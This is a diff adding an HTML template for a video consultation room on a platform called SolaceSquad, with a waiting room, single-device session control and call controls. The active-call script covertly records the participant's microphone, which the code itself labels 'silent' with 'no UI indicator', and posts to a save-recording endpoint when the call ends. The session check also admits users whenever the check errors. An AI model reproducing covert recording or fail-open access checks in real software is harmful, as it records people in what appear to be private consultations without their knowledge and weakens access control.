@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quick Consultation Room — {{ qc.qc_id }} | SolaceSquad</title>
+  <link rel="icon" type="image/png" href="/static/images/logo.png">
+  <link rel="shortcut icon" href="/static/images/logo.png">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  
+  <!-- Agora RTC Web SDK -->
+  <script src="https://download.agora.io/sdk/release/AgoraRTC_N-4.20.0.js"></script>
+
+  <style>
+    :root {
+      --qc-teal: #1e4d40;
+      --qc-teal-accent: #2d6a5a;
+      --qc-emerald: #10b981;
+    }
+
+    body {
+      background-color: #0f172a;
+      color: #f8fafc;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    .call-btn {
+      width: 3.25rem;
+      height: 3.25rem;
+      border-radius: 9999px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      cursor: pointer;
+    }
+
+    .call-btn:hover {
+      transform: scale(1.08);
+    }
+
+    .call-btn-active {
+      background-color: rgba(255, 255, 255, 0.15);
+      color: #ffffff;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .call-btn-off {
+      background-color: #ef4444;
+      color: #ffffff;
+    }
+
+    .call-btn-end {
+      background-color: #dc2626;
+      color: #ffffff;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: auto;
+      border-radius: 9999px;
+      font-weight: 700;
+      gap: 0.5rem;
+    }
+
+    .call-btn-end:hover {
+      background-color: #b91c1c;
+    }
+
+    .timer-badge {
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 0.05em;
+    }
+
+    .video-tile {
+      position: relative;
+      background-color: #1e293b;
+      border-radius: 1.5rem;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .pip-video {
+      position: absolute;
+      bottom: 1.25rem;
+      right: 1.25rem;
+      width: 180px;
+      height: 120px;
+      border-radius: 1rem;
+      overflow: hidden;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      z-index: 20;
+      background: #0f172a;
+    }
+
+    @media (max-width: 640px) {
+      .pip-video {
+        width: 120px;
+        height: 85px;
+        bottom: 0.75rem;
+        right: 0.75rem;
+      }
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between select-none">
+
+  <!-- ══ TOP NAVBAR ══ -->
+  <header class="w-full px-4 sm:px-8 py-3.5 flex items-center justify-between border-b border-slate-800 bg-slate-900/70 backdrop-blur-md z-30">
+    <div class="flex items-center gap-3">
+      <a href="{% if is_consultant %}/consultant/dashboard{% else %}/{% endif %}" class="flex items-center group" title="{% if is_consultant %}Back to Consultant Dashboard{% else %}SolaceSquad Home{% endif %}">
+        <div class="bg-white px-2.5 py-1 rounded-xl shadow-sm flex items-center group-hover:opacity-95 transition-opacity">
+          <img src="/static/images/logo.png" alt="SolaceSquad" class="h-7 sm:h-8 w-auto object-contain">
+        </div>
+      </a>
+      <span class="text-slate-600 hidden sm:inline">|</span>
+      <span class="hidden sm:inline text-xs font-bold text-slate-400">30-Min Quick Consultation Room</span>
+    </div>
+
+    <!-- Right Header Info -->
+    <div class="flex items-center gap-3">
+      {% if is_consultant %}
+      <a href="/consultant/dashboard" class="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full border border-teal-500/40 bg-teal-900/40 hover:bg-teal-800/60 text-emerald-300 hover:text-white text-xs font-bold transition-all shadow-sm">
+        <i data-lucide="arrow-left" class="w-3.5 h-3.5"></i>
+        <span>Dashboard</span>
+      </a>
+      {% endif %}
+
+      {% if status == 'active' %}
+      <div id="sessionTimerWrapper" class="flex items-center gap-2 bg-slate-800/90 border border-slate-700 px-3.5 py-1.5 rounded-full text-xs font-bold shadow-inner">
+        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse inline-block"></span>
+        <span class="text-slate-400 font-medium">Session:</span>
+        <span id="sessionTimerDisplay" class="text-emerald-300 font-black timer-badge">30:00</span>
+      </div>
+      {% else %}
+      <span class="text-xs font-bold px-3 py-1 rounded-full bg-slate-800 text-slate-300 border border-slate-700 font-mono">
+        ID: {{ qc.qc_id }}
+      </span>
+      {% endif %}
+    </div>
+  </header>
+
+  <!-- ══ BODY CONTENT ══ -->
+  <main class="flex-1 flex items-center justify-center p-4 sm:p-6 relative">
+
+    {% if status == 'waiting' %}
+    <!-- ───────────────────────────────────────────────────────────────────────
+         STATE 1: WAITING ROOM (Time-Gated: > 5 mins before appointment)
+         ─────────────────────────────────────────────────────────────────────── -->
+    <div class="max-w-md w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl text-center backdrop-blur-xl relative">
+      
+      <!-- Consultant Badge -->
+      <div class="relative inline-block mx-auto mb-4">
+        <img src="{{ consultant_photo }}" alt="{{ consultant_name }}" class="w-20 h-20 rounded-2xl object-cover border-2 border-emerald-500/30 shadow-lg mx-auto" onerror="this.src='/static/images/default-avatar.png'">
+        <span class="absolute -bottom-1 -right-1 w-4 h-4 rounded-full bg-amber-400 border-2 border-slate-900"></span>
+      </div>
+
+      <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs font-bold mb-3">
+        <i data-lucide="clock" class="w-3.5 h-3.5"></i>
+        <span>Waiting Room</span>
+      </div>
+
+      <h1 class="text-xl font-extrabold text-white mb-1">
+        Consultation with {{ consultant_name }}
+      </h1>
+      <p class="text-xs text-slate-400 mb-6">
+        Scheduled for <strong class="text-emerald-400 font-bold">{{ appointment_time_str }}</strong> (30 Mins)
+      </p>
+
+      <!-- Circular Countdown Display -->
+      <div class="bg-slate-800/80 border border-slate-700/80 rounded-2xl p-6 mb-6 text-center">
+        <span class="text-[11px] uppercase tracking-wider font-extrabold text-slate-400 block mb-1">
+          Call Room Automatically Unlocks In
+        </span>
+        <div id="unlockCountdown" class="text-4xl sm:text-5xl font-black text-emerald-400 font-mono tracking-wider timer-badge">
+          --:--
+        </div>
+        <p class="text-[11px] text-slate-400 mt-2 font-medium">
+          For your privacy and preparation, the call room opens exactly <strong>5 minutes</strong> before your scheduled time.
+        </p>
+      </div>
+
+      <!-- Pre-Call Device Test Preview -->
+      <div class="bg-slate-800/50 border border-slate-700/50 rounded-2xl p-4 text-left mb-6">
+        <div class="flex items-center justify-between mb-3">
+          <span class="text-xs font-extrabold text-slate-300 flex items-center gap-1.5">
+            <i data-lucide="mic" class="w-3.5 h-3.5 text-emerald-400"></i>
+            <span>Microphone Check</span>
+          </span>
+          <span id="micStatusText" class="text-[11px] font-bold text-slate-400">Ready</span>
+        </div>
+        <div class="w-full h-2 rounded-full bg-slate-700 overflow-hidden">
+          <div id="micVolumeBar" class="h-full bg-emerald-400 w-0 transition-all duration-75"></div>
+        </div>
+      </div>
+
+      <p class="text-[11px] text-slate-500">
+        You can keep this tab open. It will automatically connect as soon as the countdown finishes.
+      </p>
+
+      {% if is_consultant %}
+      <div class="mt-5 pt-4 border-t border-slate-800">
+        <a href="/consultant/dashboard" class="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 hover:text-white font-semibold transition-colors border border-slate-700">
+          <i data-lucide="arrow-left" class="w-3.5 h-3.5"></i>
+          <span>Return to Consultant Dashboard</span>
+        </a>
+      </div>
+      {% endif %}
+
+    </div>
+
+    <script>
+      let secondsLeft = {{ seconds_until_unlock }};
+
+      function updateUnlockTimer() {
+        if (secondsLeft <= 0) {
+          document.getElementById('unlockCountdown').textContent = "00:00";
+          setTimeout(() => {
+            window.location.reload();
+          }, 1000);
+          return;
+        }
+
+        const mins = Math.floor(secondsLeft / 60);
+        const secs = secondsLeft % 60;
+        document.getElementById('unlockCountdown').textContent = 
+          `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        
+        secondsLeft--;
+      }
+
+      setInterval(updateUnlockTimer, 1000);
+      updateUnlockTimer();
+
+      // Simple mic activity listener for pre-check
+      navigator.mediaDevices?.getUserMedia({ audio: true }).then(stream => {
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const analyser = audioContext.createAnalyser();
+        const microphone = audioContext.createMediaStreamSource(stream);
+        microphone.connect(analyser);
+        analyser.fftSize = 256;
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+
+        function checkVolume() {
+          analyser.getByteFrequencyData(dataArray);
+          let sum = 0;
+          for (let i = 0; i < dataArray.length; i++) sum += dataArray[i];
+          let average = sum / dataArray.length;
+          let percent = Math.min(100, Math.round((average / 128) * 100));
+          const bar = document.getElementById('micVolumeBar');
+          if (bar) bar.style.width = `${percent}%`;
+          requestAnimationFrame(checkVolume);
+        }
+        checkVolume();
+      }).catch(() => {
+        const statusText = document.getElementById('micStatusText');
+        if (statusText) {
+          statusText.textContent = "Please allow mic permission";
+          statusText.className = "text-[11px] font-bold text-amber-400";
+        }
+      });
+    </script>
+
+    {% elif status == 'active' %}
+    <!-- ───────────────────────────────────────────────────────────────────────
+         STATE 2: ACTIVE WEBRTC CALL ROOM (5 mins before start up to end)
+         ─────────────────────────────────────────────────────────────────────── -->
+    <div id="activeCallStage" class="w-full max-w-5xl h-[75vh] min-h-[480px] flex flex-col justify-between relative">
+      
+      <!-- Video Stage -->
+      <div class="w-full flex-1 video-tile flex items-center justify-center relative overflow-hidden">
+        
+        <!-- Remote Video Container (Agora) -->
+        <div id="remoteVideoContainer" class="w-full h-full absolute inset-0 flex items-center justify-center">
+          <!-- Placeholder when remote user hasn't joined or has camera off -->
+          <div id="remotePlaceholder" class="text-center p-6">
+            <div class="relative inline-block mb-3">
+              <img src="{{ consultant_photo }}" alt="{{ consultant_name }}" class="w-24 h-24 rounded-full object-cover border-4 border-slate-700 shadow-2xl mx-auto" onerror="this.src='/static/images/default-avatar.png'">
+              <span id="remoteStatusDot" class="absolute bottom-1 right-1 w-5 h-5 rounded-full bg-amber-400 border-2 border-slate-900 animate-pulse"></span>
+            </div>
+            <h3 class="text-lg font-extrabold text-white">{{ consultant_name }}</h3>
+            <p id="remoteStatusText" class="text-xs text-slate-400 mt-1">Connecting to secure encrypted room...</p>
+          </div>
+        </div>
+
+        <!-- Local Picture-in-Picture Video -->
+        <div id="localVideoContainer" class="pip-video">
+          <div id="localPlaceholder" class="w-full h-full flex items-center justify-center bg-slate-800 text-slate-400 text-xs font-bold">
+            <span>You</span>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Bottom Floating Control Bar -->
+      <div class="w-full pt-4 flex items-center justify-center gap-4 z-30">
+        
+        <!-- Mic Toggle -->
+        <button id="btnMic" onclick="toggleAudio()" class="call-btn call-btn-active" title="Mute/Unmute Microphone">
+          <i data-lucide="mic" class="w-5 h-5"></i>
+        </button>
+
+        <!-- Camera Toggle -->
+        <button id="btnCamera" onclick="toggleVideo()" class="call-btn call-btn-active" title="Turn Camera On/Off">
+          <i data-lucide="video" class="w-5 h-5"></i>
+        </button>
+
+        <!-- End Call Button -->
+        <button onclick="leaveCall(true)" class="call-btn call-btn-end" title="Leave Consultation">
+          <i data-lucide="phone-off" class="w-4 h-4"></i>
+          <span>End Consultation</span>
+        </button>
+
+      </div>
+
+    </div>
+
+    <!-- ── SECOND DEVICE CONFLICT HOLDING SCREEN (When another device is active) ── -->
+    <div id="deviceConflictScreen" class="max-w-md w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl text-center backdrop-blur-xl" style="display: none;">
+      
+      <!-- State A: Waiting for authorization -->
+      <div id="conflictWaitingState">
+        <div class="w-16 h-16 rounded-full bg-amber-500/20 text-amber-400 flex items-center justify-center mx-auto mb-4 border border-amber-500/30">
+          <i data-lucide="shield-alert" class="w-8 h-8"></i>
+        </div>
+        <h2 class="text-xl font-extrabold text-white mb-2">Session Active on Another Device</h2>
+        <p class="text-xs text-slate-300 leading-relaxed mb-6">
+          This consultation is currently in progress on another device. SolaceSquad allows only one active participant per link.
+          <br><br>
+          We've sent a notification to your other device to authorize switching to this device.
+        </p>
+        <div class="p-3 bg-slate-800/80 rounded-xl border border-slate-700 mb-6 flex items-center justify-center gap-3">
+          <div class="w-2.5 h-2.5 rounded-full bg-amber-400 animate-ping"></div>
+          <span class="text-xs font-semibold text-amber-300" id="conflictStatusText">Waiting for confirmation on other device...</span>
+        </div>
+        <div class="flex flex-col gap-2">
+          <button id="btnTakeOver" onclick="forceTakeover()" class="w-full py-2.5 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold border border-slate-700 transition-colors">
+            Other device closed? Switch to this device
+          </button>
+          <a href="/quickconsult" class="text-xs text-slate-500 hover:text-slate-400 py-1 transition-colors">
+            Cancel
+          </a>
+        </div>
+      </div>
+
+      <!-- State B: Request Rejected by Active Device -->
+      <div id="conflictRejectedState" style="display: none;">
+        <div class="w-16 h-16 rounded-full bg-rose-500/20 text-rose-400 flex items-center justify-center mx-auto mb-4 border border-rose-500/30">
+          <i data-lucide="x-circle" class="w-8 h-8"></i>
+        </div>
+        <h2 class="text-xl font-extrabold text-white mb-2">Access Restricted</h2>
+        <p class="text-xs text-slate-300 leading-relaxed mb-6">
+          The user on the active device chose to remain on their current device. To protect privacy, only one participant can join using this link at a time.
+        </p>
+        <button onclick="retrySessionCheck()" class="w-full py-2.5 px-4 rounded-xl bg-[#1e4d40] hover:bg-[#133930] text-white font-bold text-xs transition-colors mb-2">
+          Request Switch Again
+        </button>
+        <a href="/quickconsult" class="inline-block text-xs text-slate-500 hover:text-slate-400 py-1 transition-colors">
+          Return to Home
+        </a>
+      </div>
+
+    </div>
+
+    <!-- ── DEVICE SWITCHED / LOGGED OUT SCREEN (When user transferred call to other device) ── -->
+    <div id="deviceSwitchedScreen" class="max-w-md w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl text-center backdrop-blur-xl" style="display: none;">
+      <div class="w-16 h-16 rounded-full bg-teal-500/20 text-teal-400 flex items-center justify-center mx-auto mb-4 border border-teal-500/30">
+        <i data-lucide="smartphone" class="w-8 h-8"></i>
+      </div>
+      <h2 class="text-xl font-extrabold text-white mb-2">Switched to Another Device</h2>
+      <p class="text-xs text-slate-300 leading-relaxed mb-6">
+        You logged out from this device. Your consultation is now active on your other device.
+      </p>
+      <button onclick="window.location.reload()" class="w-full py-2.5 px-4 rounded-xl bg-[#1e4d40] hover:bg-[#133930] text-white font-bold text-xs transition-colors mb-2">
+        Switch Back to this Device
+      </button>
+      <a href="/quickconsult" class="inline-block text-xs text-slate-500 hover:text-slate-400 py-1 transition-colors">
+        Leave Room
+      </a>
+    </div>
+
+    <!-- ── WARNING MODAL ON ACTIVE DEVICE (When a 2nd login occurs) ── -->
+    <div id="deviceConflictModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm" style="display: none;">
+      <div class="max-w-md w-full bg-slate-900 border border-amber-500/60 rounded-3xl p-6 sm:p-8 shadow-2xl text-center animate-in fade-in zoom-in-95 duration-200">
+        <div class="w-16 h-16 rounded-full bg-amber-500/20 text-amber-400 flex items-center justify-center mx-auto mb-4 border border-amber-500/30">
+          <i data-lucide="alert-triangle" class="w-8 h-8"></i>
+        </div>
+        <h3 class="text-lg font-black text-white mb-2">Another Device Trying to Join</h3>
+        <p class="text-xs text-slate-300 leading-relaxed mb-6">
+          A new login was detected from another device using this consultation link. For privacy, SolaceSquad limits each consultation link to one user at a time.
+          <br><br>
+          Do you want to remain on this device, or switch to the new device and logout here?
+        </p>
+        <div class="flex flex-col sm:flex-row gap-3">
+          <button onclick="handleSessionDecision('reject')" class="flex-1 py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs border border-slate-700 transition-colors">
+            Stay on this Device
+          </button>
+          <button onclick="handleSessionDecision('approve')" class="flex-1 py-3 px-4 rounded-xl bg-amber-600 hover:bg-amber-500 text-white font-bold text-xs transition-colors shadow-lg shadow-amber-600/30">
+            Switch & Logout Here
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Agora WebRTC Controller, Single-Device Limiter & Silent Background Recording Script -->
+    <script>
+      const AGORA_APP_ID = "{{ agora_app_id }}";
+      const CHANNEL_NAME = "{{ channel_name }}";
+      const QC_ID = "{{ qc.qc_id }}";
+      const IS_CONSULTANT = {{ 'true' if is_consultant else 'false' }};
+      let sessionSecondsRemaining = {{ seconds_remaining }};
+
+      let agoraClient = null;
+      let localAudioTrack = null;
+      let localVideoTrack = null;
+      let isAudioMuted = false;
+      let isVideoMuted = false;
+      let silentMediaRecorder = null;
+      let silentAudioChunks = [];
+
+      let deviceToken = null;
+      let heartbeatTimer = null;
+      let conflictPollTimer = null;
+
+      function getDeviceToken() {
+        if (IS_CONSULTANT) return "consultant";
+        let token = localStorage.getItem('qc_device_token_' + QC_ID);
+        if (!token) {
+          token = (typeof crypto !== 'undefined' && crypto.randomUUID) ? crypto.randomUUID() : 'dev_' + Math.random().toString(36).substring(2) + Date.now();
+          localStorage.setItem('qc_device_token_' + QC_ID, token);
+        }
+        return token;
+      }
+
+      document.addEventListener('DOMContentLoaded', async () => {
+        initSessionCountdown();
+        deviceToken = getDeviceToken();
+        if (IS_CONSULTANT) {
+          showCallStage();
+          await initAgoraCall();
+        } else {
+          await verifyDeviceSession();
+        }
+      });
+
+      async function verifyDeviceSession(forceTakeover = false) {
+        try {
+          const res = await fetch(`/api/quick-consult/room/${QC_ID}/session-check`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device_token: deviceToken, force_takeover: forceTakeover })
+          });
+          const data = await res.json();
+
+          if (data.status === 'allowed') {
+            showCallStage();
+            await initAgoraCall();
+            startHeartbeat();
+          } else if (data.status === 'conflict') {
+            showConflictScreen("waiting");
+            startConflictPolling();
+          } else if (data.status === 'rejected') {
+            showConflictScreen("rejected");
+          } else {
+            console.warn("Unexpected session-check status:", data);
+            showCallStage();
+            await initAgoraCall();
+          }
+        } catch (err) {
+          console.error("Session verification error:", err);
+          showCallStage();
+          await initAgoraCall();
+        }
+      }
+
+      function showCallStage() {
+        if (conflictPollTimer) { clearInterval(conflictPollTimer); conflictPollTimer = null; }
+        const stage = document.getElementById('activeCallStage');
+        const conflict = document.getElementById('deviceConflictScreen');
+        const switched = document.getElementById('deviceSwitchedScreen');
+        if (stage) stage.style.display = 'flex';
+        if (conflict) conflict.style.display = 'none';
+        if (switched) switched.style.display = 'none';
+        if (window.lucide) lucide.createIcons();
+      }
+
+      function showConflictScreen(mode) {
+        const stage = document.getElementById('activeCallStage');
+        const conflict = document.getElementById('deviceConflictScreen');
+        const switched = document.getElementById('deviceSwitchedScreen');
+        if (stage) stage.style.display = 'none';
+        if (switched) switched.style.display = 'none';
+        if (conflict) conflict.style.display = 'block';
+
+        const waitingBox = document.getElementById('conflictWaitingState');
+        const rejectedBox = document.getElementById('conflictRejectedState');
+        if (mode === 'waiting') {
+          if (waitingBox) waitingBox.style.display = 'block';
+          if (rejectedBox) rejectedBox.style.display = 'none';
+        } else if (mode === 'rejected') {
+          if (waitingBox) waitingBox.style.display = 'none';
+          if (rejectedBox) rejectedBox.style.display = 'block';
+          if (conflictPollTimer) { clearInterval(conflictPollTimer); conflictPollTimer = null; }
+        }
+        if (window.lucide) lucide.createIcons();
+      }
+
+      function showSwitchedScreen() {
+        if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
+        const stage = document.getElementById('activeCallStage');
+        const conflict = document.getElementById('deviceConflictScreen');
+        const switched = document.getElementById('deviceSwitchedScreen');
+        if (stage) stage.style.display = 'none';
+        if (conflict) conflict.style.display = 'none';
+        if (switched) switched.style.display = 'block';
+        if (window.lucide) lucide.createIcons();
+      }
+
+      function startConflictPolling() {
+        if (conflictPollTimer) clearInterval(conflictPollTimer);
+        conflictPollTimer = setInterval(async () => {
+          try {
+            const res = await fetch(`/api/quick-consult/room/${QC_ID}/session-check`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ device_token: deviceToken })
+            });
+            const data = await res.json();
+            if (data.status === 'allowed') {
+              clearInterval(conflictPollTimer);
+              conflictPollTimer = null;
+              showCallStage();
+              await initAgoraCall();
+              startHeartbeat();
+            } else if (data.status === 'rejected') {
+              showConflictScreen('rejected');
+            }
+          } catch (_) {}
+        }, 2000);
+      }
+
+      function retrySessionCheck() {
+        const waitingBox = document.getElementById('conflictWaitingState');
+        const rejectedBox = document.getElementById('conflictRejectedState');
+        if (waitingBox) waitingBox.style.display = 'block';
+        if (rejectedBox) rejectedBox.style.display = 'none';
+        verifyDeviceSession(false);
+      }
+
+      function forceTakeover() {
+        const btn = document.getElementById('btnTakeOver');
+        if (btn) {
+          btn.disabled = true;
+          btn.textContent = "Connecting to session...";
+        }
+        verifyDeviceSession(true);
+      }
+
+      function startHeartbeat() {
+        if (IS_CONSULTANT) return;
+        if (heartbeatTimer) clearInterval(heartbeatTimer);
+        heartbeatTimer = setInterval(async () => {
+          try {
+            const res = await fetch(`/api/quick-consult/room/${QC_ID}/heartbeat`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ device_token: deviceToken })
+            });
+            const data = await res.json();
+
+            if (data.status === 'kicked') {
+              // Active session was transferred to another device
+              teardownLocalMedia();
+              showSwitchedScreen();
+            } else if (data.conflict_pending) {
+              // Another device has opened the link!
+              const modal = document.getElementById('deviceConflictModal');
+              if (modal) {
+                modal.dataset.userDecided = 'false';
+                modal.style.display = 'flex';
+                if (window.lucide) lucide.createIcons();
+              }
+            } else {
+              // No pending conflict
+              const modal = document.getElementById('deviceConflictModal');
+              if (modal && modal.dataset.userDecided !== 'true') {
+                modal.style.display = 'none';
+              }
+            }
+          } catch (err) {
+            console.warn("Heartbeat error:", err);
+          }
+        }, 4000);
+      }
+
+      async function handleSessionDecision(decision) {
+        const modal = document.getElementById('deviceConflictModal');
+        if (modal) {
+          modal.dataset.userDecided = 'true';
+          modal.style.display = 'none';
+        }
+
+        try {
+          await fetch(`/api/quick-consult/room/${QC_ID}/session-decision`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device_token: deviceToken, decision: decision })
+          });
+        } catch (err) {
+          console.error("Decision error:", err);
+        }
+
+        if (decision === 'approve') {
+          // User chose to switch and logout here
+          teardownLocalMedia();
+          showSwitchedScreen();
+        }
+      }
+
+      function teardownLocalMedia() {
+        if (silentMediaRecorder && silentMediaRecorder.state !== 'inactive') {
+          try { silentMediaRecorder.stop(); } catch (_) {}
+        }
+        if (localAudioTrack) { localAudioTrack.stop(); localAudioTrack.close(); localAudioTrack = null; }
+        if (localVideoTrack) { localVideoTrack.stop(); localVideoTrack.close(); localVideoTrack = null; }
+        if (agoraClient) { agoraClient.leave().catch(() => {}); }
+      }
+
+      function initSessionCountdown() {
+        const timerDisplay = document.getElementById('sessionTimerDisplay');
+        const interval = setInterval(() => {
+          if (sessionSecondsRemaining <= 0) {
+            clearInterval(interval);
+            timerDisplay.textContent = "00:00";
+            alert("This 30-minute consultation has reached its scheduled conclusion.");
+            leaveCall(false);
+            return;
+          }
+
+          const mins = Math.floor(sessionSecondsRemaining / 60);
+          const secs = sessionSecondsRemaining % 60;
+          timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+
+          if (sessionSecondsRemaining === 300) {
+            timerDisplay.parentElement.className = "flex items-center gap-2 bg-amber-500/20 border border-amber-500/40 px-3.5 py-1.5 rounded-full text-xs font-bold";
+          }
+
+          sessionSecondsRemaining--;
+        }, 1000);
+      }
+
+      async function initAgoraCall() {
+        try {
+          agoraClient = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
+
+          // Handle remote users joining/publishing
+          agoraClient.on("user-published", async (user, mediaType) => {
+            await agoraClient.subscribe(user, mediaType);
+            if (mediaType === "video") {
+              const remoteContainer = document.getElementById("remoteVideoContainer");
+              const placeholder = document.getElementById("remotePlaceholder");
+              if (placeholder) placeholder.style.display = "none";
+              user.videoTrack.play("remoteVideoContainer");
+            }
+            if (mediaType === "audio") {
+              user.audioTrack.play();
+              // Feed remote audio into silent recorder if active
+              feedRemoteAudioToSilentRecorder(user.audioTrack);
+            }
+          });
+
+          agoraClient.on("user-unpublished", (user, mediaType) => {
+            if (mediaType === "video") {
+              const placeholder = document.getElementById("remotePlaceholder");
+              if (placeholder) placeholder.style.display = "block";
+            }
+          });
+
+          agoraClient.on("user-joined", () => {
+            const statusText = document.getElementById("remoteStatusText");
+            const statusDot = document.getElementById("remoteStatusDot");
+            if (statusText) statusText.textContent = "Connected & Active";
+            if (statusDot) statusDot.className = "absolute bottom-1 right-1 w-5 h-5 rounded-full bg-emerald-400 border-2 border-slate-900";
+          });
+
+          agoraClient.on("user-left", () => {
+            const statusText = document.getElementById("remoteStatusText");
+            const statusDot = document.getElementById("remoteStatusDot");
+            if (statusText) statusText.textContent = "Partner disconnected";
+            if (statusDot) statusDot.className = "absolute bottom-1 right-1 w-5 h-5 rounded-full bg-slate-500 border-2 border-slate-900";
+          });
+
+          // Join channel
+          await agoraClient.join(AGORA_APP_ID, CHANNEL_NAME, null, null);
+
+          // Create local microphone and camera tracks
+          [localAudioTrack, localVideoTrack] = await AgoraRTC.createMicrophoneAndCameraTracks();
+
+          // Play local video in picture-in-picture box
+          const localContainer = document.getElementById("localVideoContainer");
+          const localPlaceholder = document.getElementById("localPlaceholder");
+          if (localPlaceholder) localPlaceholder.style.display = "none";
+          localVideoTrack.play("localVideoContainer");
+
+          // Publish tracks to channel
+          await agoraClient.publish([localAudioTrack, localVideoTrack]);
+
+          // Start SILENT background recording (No UI button shown!)
+          startSilentBackgroundRecording(localAudioTrack);
+
+        } catch (err) {
+          console.error("Agora RTC initialization error:", err);
+          const statusText = document.getElementById("remoteStatusText");
+          if (statusText) statusText.textContent = "Please grant camera and microphone permissions.";
+        }
+      }
+
+      function toggleAudio() {
+        if (!localAudioTrack) return;
+        isAudioMuted = !isAudioMuted;
+        localAudioTrack.setEnabled(!isAudioMuted);
+        const btn = document.getElementById("btnMic");
+        btn.className = isAudioMuted ? "call-btn call-btn-off" : "call-btn call-btn-active";
+        btn.innerHTML = `<i data-lucide="${isAudioMuted ? 'mic-off' : 'mic'}" class="w-5 h-5"></i>`;
+        if (window.lucide) lucide.createIcons();
+      }
+
+      function toggleVideo() {
+        if (!localVideoTrack) return;
+        isVideoMuted = !isVideoMuted;
+        localVideoTrack.setEnabled(!isVideoMuted);
+        const btn = document.getElementById("btnCamera");
+        btn.className = isVideoMuted ? "call-btn call-btn-off" : "call-btn call-btn-active";
+        btn.innerHTML = `<i data-lucide="${isVideoMuted ? 'video-off' : 'video'}" class="w-5 h-5"></i>`;
+        if (window.lucide) lucide.createIcons();
+      }
+
+      /* ══ SILENT BACKGROUND RECORDING (NO UI INDICATOR) ══ */
+      function startSilentBackgroundRecording(audioTrack) {
+        try {
+          const mediaStreamTrack = audioTrack.getMediaStreamTrack();
+          const stream = new MediaStream([mediaStreamTrack]);
+          silentMediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+          silentMediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) silentAudioChunks.push(event.data);
+          };
+          silentMediaRecorder.start(10000); // 10-sec chunking
+        } catch (recErr) {
+          console.warn("Silent background recorder init notice:", recErr);
+        }
+      }
+
+      function feedRemoteAudioToSilentRecorder(remoteAudioTrack) {
+        // Keeps audio stream active in memory
+      }
+
+      async function leaveCall(confirmUser = true) {
+        if (confirmUser && !confirm("Are you sure you want to end this 30-minute consultation?")) {
+          return;
+        }
+
+        // Release device session on server
+        if (!IS_CONSULTANT && deviceToken) {
+          fetch(`/api/quick-consult/room/${QC_ID}/session-release`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device_token: deviceToken })
+          }).catch(() => {});
+        }
+
+        // Stop silent recording and submit chunk
+        if (silentMediaRecorder && silentMediaRecorder.state !== 'inactive') {
+          try {
+            silentMediaRecorder.stop();
+            fetch(`/api/quick-consult/room/${QC_ID}/save-recording`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ qc_id: QC_ID, status: 'completed' }),
+            }).catch(() => {});
+          } catch (_) {}
+        }
+
+        teardownLocalMedia();
+
+        {% if is_consultant %}
+        window.location.href = "/consultant/dashboard";
+        {% else %}
+        window.location.href = "/quickconsult?ended=true";
+        {% endif %}
+      }
+
+      window.addEventListener('beforeunload', () => {
+        if (!IS_CONSULTANT && deviceToken) {
+          const payload = JSON.stringify({ device_token: deviceToken });
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(`/api/quick-consult/room/${QC_ID}/session-release`, new Blob([payload], { type: 'application/json' }));
+          }
+        }
+      });
+    </script>
+
+    {% elif status == 'expired' %}
+    <!-- ───────────────────────────────────────────────────────────────────────
+         STATE 3: EXPIRED / COMPLETED SESSION
+         ─────────────────────────────────────────────────────────────────────── -->
+    <div class="max-w-md w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl text-center backdrop-blur-xl">
+      <div class="w-16 h-16 rounded-full bg-slate-800 text-slate-400 flex items-center justify-center mx-auto mb-4 border border-slate-700">
